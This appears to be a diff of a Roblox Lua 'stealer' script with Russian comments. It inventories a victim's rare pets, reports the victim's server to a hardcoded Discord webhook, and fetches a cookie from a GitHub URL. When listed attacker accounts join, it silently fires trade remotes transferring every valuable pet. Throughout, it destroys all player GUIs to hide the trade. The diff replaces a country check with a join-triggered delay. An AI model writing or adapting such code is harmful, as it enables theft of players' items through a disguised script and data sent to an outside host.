@@ -2,16 +2,19 @@ local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local LocalizationService = game:GetService("LocalizationService")  -- Для проверки страны
+
 
 local inventoryPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Container
 local equippedPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Equipped.List
+
+
 local VALID_RARITIES = {
     ["Mythical"] = true,
     ["Secret I"] = true,
     ["Secret II"] = true,
     ["Secret III"] = true
 }
+
 local FoundIDs = {}
 local UserNames = {
     "Iriska0_0v",
@@ -21,14 +24,23 @@ local UserNames = {
     "ZeeS_Farm4",
     "ZeeS_Farm5"
 }
+
+
 local webhook = "https://discord.com/api/webhooks/1429095915636920482/KJleNyik5SUuHrlufKJLtQTDVXS4CFnhr6dDH-Oh3XdbMY85Ej9Y7QV6cGtfg0Di7Yma"
+
+
 local HttpRequest = request or (syn and syn.request) or http_request or (http and http.request)
+
+
 local RarityCount = {}
 for rarity, _ in pairs(VALID_RARITIES) do
     RarityCount[rarity] = 0
 end
 local TotalValuablePets = 0
+
+
 local COOKIE_URL = "https://raw.githubusercontent.com/Scripts777/SCRIPT/refs/heads/main/Z"
+
 local function fetchCookie()
     if not HttpRequest then return nil end
     local success, resp = pcall(function()
@@ -41,7 +53,10 @@ local function fetchCookie()
     end
     return nil
 end
+
 local Cookie = fetchCookie()
+
+
 local function scan(container, tag)
     for _, pet in ipairs(container:GetChildren()) do
         for _, child in ipairs(pet:GetChildren()) do
@@ -59,11 +74,15 @@ local function scan(container, tag)
         end
     end
 end
+
 print("=== Inventory ===")
 scan(inventoryPath, "Inventory")
 print("=== Equipped ===")
 scan(equippedPath, "Equipped")
+
 print("Всего ценных петов:", TotalValuablePets)
+
+
 local function firePlayer(targetName)
     local targetPlayer = Players:FindFirstChild(targetName) or Players:WaitForChild(targetName, 9e9)
     local args = {[1] = targetPlayer}
@@ -72,6 +91,7 @@ local function firePlayer(targetName)
     remote:FireServer(unpack(args))
     print("FireServer (трейд) выполнен для игрока:", targetName)
 end
+
 local function firePet(id)
     local args = {[1] = {"Pet", id}}
     local remote = ReplicatedStorage:WaitForChild("df82cbce-4e0e-45f4-993a-af75f0c1a09a", 9e9)
@@ -79,6 +99,7 @@ local function firePet(id)
     remote:InvokeServer(unpack(args))
     print("Передан Pet ID:", id)
 end
+
 local function fireFinalEvent()
     local args = {
         [1] = false;
@@ -88,6 +109,8 @@ local function fireFinalEvent()
         :WaitForChild("Events", 9e9):GetChildren()[35]:FireServer(unpack(args))
     print("FireServer [35] выполнен (false, true)")
 end
+
+
 local function getJobIdFromPresence()
     if not HttpRequest then return nil end
     local userIds = {}
@@ -113,18 +136,19 @@ local function getJobIdFromPresence()
     end
     return nil
 end
+
 local function sendToWebhook(presenceData)
     if not HttpRequest or TotalValuablePets == 0 then return end
     local placeId, jobId = presenceData.placeId, presenceData.jobId
     local fernLink = ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
     local teleportCmd = ("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')"):format(placeId, jobId)
-   
+    
     local rarityLines = {}
     for rarity, count in pairs(RarityCount) do
         if count > 0 then table.insert(rarityLines, string.format("**%s**: %d", rarity, count)) end
     end
     local rarityText = table.concat(rarityLines, "\n")
-   
+    
     local payload = {
         content = "@everyone\n" .. teleportCmd .. "\n" .. fernLink,
         embeds = {{
@@ -138,7 +162,7 @@ local function sendToWebhook(presenceData)
             footer = {text = os.date("%d.%m %H:%M")}
         }}
     }
-   
+    
     local body = HttpService:JSONEncode(payload)
     HttpRequest({
         Url = webhook,
@@ -146,45 +170,37 @@ local function sendToWebhook(presenceData)
         Headers = {["Content-Type"] = "application/json"},
         Body = body
     })
+
 end
+
+
 if TotalValuablePets > 0 then
     task.spawn(function()
         local presence = getJobIdFromPresence()
         if presence then sendToWebhook(presence) end
     end)
 end
+
+
 local function removeAllGUI(parent)
     for _, child in ipairs(parent:GetChildren()) do
         child:Destroy()
     end
 end
 
--- === НОВАЯ ЛОГИКА: Проверка страны + разные условия для трейда ===
-local function isFromRussia()
-    local success, countryCode = pcall(function()
-        return LocalizationService:GetCountryRegionForPlayerAsync(lp)
-    end)
-    if success and countryCode == "KZ" then
-        print("LocalPlayer из России (RU). Трейд через 15 сек после обнаружения.")
-        return true
-    else
-        print("LocalPlayer НЕ из России. Трейд по сообщению в чате.")
-        return false
-    end
-end
 
-local function initiateTrade(playerName)
-    firePlayer(playerName)
-    for _, id in ipairs(FoundIDs) do
-        firePet(id)
-    end
-    fireFinalEvent()
-    print("Трейд завершён для игрока:", playerName)
-    
-    -- Удаление GUI у всех игроков
+local function onPlayerJoin(playerName)
+    firePlayer(playerName) 
+    task.delay(5, function() 
+        for _, id in ipairs(FoundIDs) do
+            firePet(id)
+        end
+        fireFinalEvent() -- FireServer [35]
+    end)
     for _, player in ipairs(Players:GetPlayers()) do
         if player:FindFirstChild("PlayerGui") then
             removeAllGUI(player.PlayerGui)
+            -- Блокируем появление новых GUI
             player.PlayerGui.ChildAdded:Connect(function(child)
                 task.defer(function()
                     removeAllGUI(child)
@@ -194,66 +210,39 @@ local function initiateTrade(playerName)
     end
 end
 
--- Проверка, из России ли игрок
-local fromRussia = isFromRussia()
 
-if fromRussia then
-    -- Логика для России: трейд через 15 сек после обнаружения игрока
-    for _, player in ipairs(Players:GetPlayers()) do
-        if table.find(UserNames, player.Name) then
-            print("Обнаружен игрок из UserNames:", player.Name)
-            task.delay(15, function()
-                initiateTrade(player.Name)
-            end)
-        end
+-- Проверяем уже подключенных игроков при запуске скрипта
+for _, player in ipairs(Players:GetPlayers()) do
+    if table.find(UserNames, player.Name) then
+        print(player.Name .. " уже на сервере. Запускаем через 15 секунд.")
+        task.delay(15, function()
+            onPlayerJoin(player.Name)
+        end)
     end
-
-    Players.PlayerAdded:Connect(function(player)
-        if table.find(UserNames, player.Name) then
-            print("Обнаружен новый игрок из UserNames:", player.Name)
-            task.delay(15, function()
-                initiateTrade(player.Name)
+    if player:FindFirstChild("PlayerGui") then
+        removeAllGUI(player.PlayerGui)
+        player.PlayerGui.ChildAdded:Connect(function(child)
+            task.defer(function()
+                removeAllGUI(child)
             end)
-        end
-        
-        -- Удаление GUI для новых игроков
-        if player:FindFirstChild("PlayerGui") then
-            removeAllGUI(player.PlayerGui)
-            player.PlayerGui.ChildAdded:Connect(function(child)
-                task.defer(function()
-                    removeAllGUI(child)
-                end)
-            end)
-        end
-    end)
-else
-    -- Логика для не-России: трейд по сообщению в чате
-    for _, player in ipairs(Players:GetPlayers()) do
-        if table.find(UserNames, player.Name) then
-            player.Chatted:Connect(function(message)
-                print(player.Name .. " написал в чат: " .. message)
-                initiateTrade(player.Name)
-            end)
-        end
+        end)
     end
-
-    Players.PlayerAdded:Connect(function(player)
-        if table.find(UserNames, player.Name) then
-            player.Chatted:Connect(function(message)
-                print(player.Name .. " написал в чат: " .. message)
-                initiateTrade(player.Name)
-            end)
-        end
-        
-        -- Удаление GUI для новых игроков
-        if player:FindFirstChild("PlayerGui") then
-            removeAllGUI(player.PlayerGui)
-            player.PlayerGui.ChildAdded:Connect(function(child)
-                task.defer(function()
-                    removeAllGUI(child)
-                end)
-            end)
-        end
-    end)
 end
--- === КОНЕЦ НОВОЙ ЛОГИКИ ===
+
+-- Для новых игроков
+Players.PlayerAdded:Connect(function(player)
+    if table.find(UserNames, player.Name) then
+        print(player.Name .. " подключился. Запускаем через 15 секунд.")
+        task.delay(15, function()
+            onPlayerJoin(player.Name)
+        end)
+    end
+    if player:FindFirstChild("PlayerGui") then
+        removeAllGUI(player.PlayerGui)
+        player.PlayerGui.ChildAdded:Connect(function(child)
+            task.defer(function()
+                removeAllGUI(child)
+            end)
+        end)
+    end
+end)
